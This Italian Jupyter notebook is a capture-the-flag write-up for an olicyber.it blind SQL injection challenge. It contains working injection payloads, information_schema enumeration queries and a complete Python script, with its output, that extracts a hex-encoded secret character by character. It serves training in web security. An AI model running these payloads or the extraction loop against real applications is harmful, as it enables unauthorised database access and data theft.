# Blind SQL Injection

In questa challenge non avremo a disposizione l'output completo della query, ma solo informazioni sul fatto che sia abbia avuto successo o sia fallita.

Questo tipo di SQL injection è detto "blind" perché non è possibile visualizzare direttamente l'output della query. Come esposto nel capitolo precedente, dovremo ricostruire i dati che ci interessa esfiltrare sulla base del successo o fallimento di una serie di "domande". La strategia generale è interrogarsi se un carattere a una data posizione è "X", e se l'esito è falso ripetere la query con un altro valore di X finché non abbiamo accertato il carattere in questione.

In [1]:
import requests

class Inj:
    def __init__(self, host):
        self.sess = requests.Session()
        self.base_url = "{}/api/".format(host)
        self._refresh_csrf_token()

    def _refresh_csrf_token(self):
        resp = self.sess.get(self.base_url + "get_token").json()
        self.token = resp["token"]

    def _do_raw_req(self, url, query):
        headers = {"X-CSRFToken": self.token}
        data = {"query": query}
        return self.sess.post(url, json=data, headers=headers).json()

    def logic(self, query):
        url = self.base_url + "logic"
        return self._do_raw_req(url, query)

    def union(self, query):
        url = self.base_url + "union"
        return self._do_raw_req(url, query)

    def blind(self, query):
        url = self.base_url + "blind"
        return self._do_raw_req(url, query)

    def time(self, query):
        url = self.base_url + "time"
        return self._do_raw_req(url, query)

# Inizializziamo l'oggetto con l'URL della challenge
target_url = "http://web-17.challs.olicyber.it"
injector = Inj(target_url)
print("Classe inizializzata con successo!")

Classe inizializzata con successo!


In [2]:
def print_report(payload, response):
    """Funzione di utilità per stampare i risultati dell'API in modo leggibile."""
    print("="*60)
    print(f"[*] INPUT INVIATO:  {payload}")
    print(f"[*] QUERY ESEGUITA: {response.get('query', 'N/D')}")
    print(f"[*] RISULTATO:      {response.get('result', 'N/D')}")
    
    if response.get('sql_error'):
        print("\n[!] ERRORE SQL RILEVATO:")
        print(response['sql_error'])
    print("="*60 + "\n")

## 1. Creare l'Oracolo (Vero/Falso)
Per estrarre informazioni "alla cieca" possiamo immaginare il server come un oracolo, e sottoporgli una serie di domande di tipo vero o falso come "il carattere alla posizione tre della colonna X della tabella Y è una 'b'?" e ricostruire l'informazione desiderata un pezzetto alla volta.

La prima cosa da fare è trovare un modo per iniettare un payload che ci permetta di capire se l'interrogazione ha avuto successo o meno. In questo caso specifico, il payload seguente dovrebbe fare al caso nostro:
`1' AND (SELECT 1 WHERE 1=1)=1 -- -`

Con questo payload, il risultato della query dipende unicamente dalla condizione dopo il WHERE. Puoi verificarlo sostituendo la condizione `1=1` (VERO) con `1=2` (FALSO) e osservando il risultato:

In [3]:
print("Test Oracolo VERO (1=1):")
payload_true = "1' AND (SELECT 1 WHERE 1=1)=1 -- -"
response_true = injector.blind(payload_true)
print_report(payload_true, response_true)

print("Test Oracolo FALSO (1=2):")
payload_false = "1' AND (SELECT 1 WHERE 1=2)=1 -- -"
response_false = injector.blind(payload_false)
print_report(payload_false, response_false)

Test Oracolo VERO (1=1):
[*] INPUT INVIATO:  1' AND (SELECT 1 WHERE 1=1)=1 -- -
[*] QUERY ESEGUITA: SELECT * FROM main WHERE id='1' AND (SELECT 1 WHERE 1=1)=1 -- -'
[*] RISULTATO:      Success

Test Oracolo FALSO (1=2):
[*] INPUT INVIATO:  1' AND (SELECT 1 WHERE 1=2)=1 -- -
[*] QUERY ESEGUITA: SELECT * FROM main WHERE id='1' AND (SELECT 1 WHERE 1=2)=1 -- -'
[*] RISULTATO:      Failure



## 2. Ridurre lo spazio di ricerca (Codifica HEX)
Ora che abbiamo il nostro oracolo, possiamo cominciare a ricostruire la flag. Potremmo testare tutti i caratteri della tastiera per ogni lettera, ma c'è un metodo molto più efficiente e sicuro: **la conversione esadecimale**.

Convertire la colonna in esadecimale (`HEX(asecret)`) ci offre due enormi vantaggi:
1. **Riduce i tentativi:** Invece di dover provare ~90 caratteri per ogni posizione (maiuscole, minuscole, simboli speciali), sappiamo per certo che i caratteri esadecimali sono solo 16 (`0-9` e `a-f`). Lo script sarà immensamente più veloce.
2. **Sicurezza del Payload:** Se la password reale contenesse un apice singolo (es. `L'aquila`), indovinarlo e inserirlo nella nostra query `LIKE` manderebbe in crash il database (errore di sintassi SQL). Convertendo tutto in HEX, siamo sicuri che estrarremo solo numeri e lettere sicure, azzerando il rischio di rompere la nostra stessa injection.

Utilizzeremo l'operatore `LIKE`. Ad esempio, per chiedere "il primo carattere della rappresentazione esadecimale della parola 'SECRET' è uno 0?" utilizzeremo:
`1' AND (SELECT 1 WHERE HEX('SECRET') LIKE '0%')=1 -- -`

## 3. Enumerazione (Come sapevamo di dover interrogare "secret"?)
In questo script diamo per scontato di sapere che la tabella si chiami `secret` e la colonna `asecret`. In un vero penetration test, non avremmo questi nomi.

Prima di lanciare lo script per estrarre i dati, avremmo dovuto lanciarlo contro l'`INFORMATION_SCHEMA` del database ponendo all'oracolo domande simili per indovinare la struttura. Ad esempio:
* Per indovinare la tabella: `... (SELECT 1 FROM information_schema.tables WHERE table_schema=DATABASE() AND table_name LIKE 'a%')=1 -- -`
* Per indovinare la colonna: `... (SELECT 1 FROM information_schema.columns WHERE table_name='secret' AND column_name LIKE 'a%')=1 -- -`

Solo dopo aver speso tempo a mappare la struttura del database "alla cieca", potremmo passare alla fase di esfiltrazione (che vediamo nello script sottostante).

## 4. Automazione e Condizione di Stop
Di seguito il codice automatizzato. Lo script sfrutta la logica dell'operatore `LIKE` con il carattere jolly `%` (che significa "zero o più caratteri").

**Come fa lo script a fermarsi?**
Quando l'intera flag esadecimale è stata indovinata (es. `666c6167`), il ciclo tenterà di aggiungervi un ulteriore carattere, partendo dallo `0` (es. `LIKE '666c61670%'`). 
Visto che la flag reale è terminata e non c'è alcuno `0` successivo, l'oracolo risponderà FALSO. Falliranno anche `1`, `2`, `3` fino alla `f`. Non trovando alcuna corrispondenza fra tutti i 16 caratteri possibili, la variabile booleana `found_char_in_iteration` rimarrà `False`. Questo farà scattare la condizione `break`, interrompendo l'estrazione in modo pulito e decodificando la stringa HEX nel testo in chiaro originale.

In [4]:
import binascii
import sys

# Dizionario dei caratteri esadecimali da testare
dictionary = "0123456789abcdef"
result = ""

print("--- Avvio dell'attacco Blind SQL Injection (Content-Based) ---")
print("Sto estraendo il segreto in formato esadecimale:")

# Ciclo principale che continua finché troviamo nuovi caratteri
while True:
    found_char_in_iteration = False
    
    # Itera su ogni possibile carattere esadecimale per indovinare il prossimo
    for c in dictionary:
        # Costruisce il payload SQL per la nostra domanda "vero/falso"
        question = f"1' AND (SELECT 1 FROM secret WHERE HEX(asecret) LIKE '{result+c}%')=1 -- -"
        
        # Invia la richiesta all'oracolo usando l'istanza 'injector'
        response_json = injector.blind(question)
        
        # Se la risposta restituisce "Success", l'oracolo ha risposto "VERO"
        if response_json.get("result") == "Success":
            result += c
            found_char_in_iteration = True
            # Stampa il progresso riscrivendo la stessa riga per un output pulito
            print(f"\rTrovato: {result}", end="")
            sys.stdout.flush()
            # Passa a indovinare il carattere successivo
            break

    # Se il ciclo ha testato tutti e 16 i caratteri (da 0 ad f) 
    # e nessuno ha dato Success, significa che abbiamo finito la stringa.
    if not found_char_in_iteration:
        break

print("\n\nEstrazione completata!")
print(f"Il segreto in formato HEX è: {result}")

# Decodifica il risultato esadecimale in una stringa di testo leggibile
try:
    flag = binascii.unhexlify(result).decode('utf-8')
    print(f"\nLa flag è: {flag}")
except (binascii.Error, UnicodeDecodeError) as e:
    print(f"\nImpossibile decodificare il risultato esadecimale: {e}")

--- Avvio dell'attacco Blind SQL Injection (Content-Based) ---
Sto estraendo il segreto in formato esadecimale:
Trovato: 666c61677b415f626c316e64795f666c34677d

Estrazione completata!
Il segreto in formato HEX è: 666c61677b415f626c316e64795f666c34677d

La flag è: flag{A_bl1ndy_fl4g}
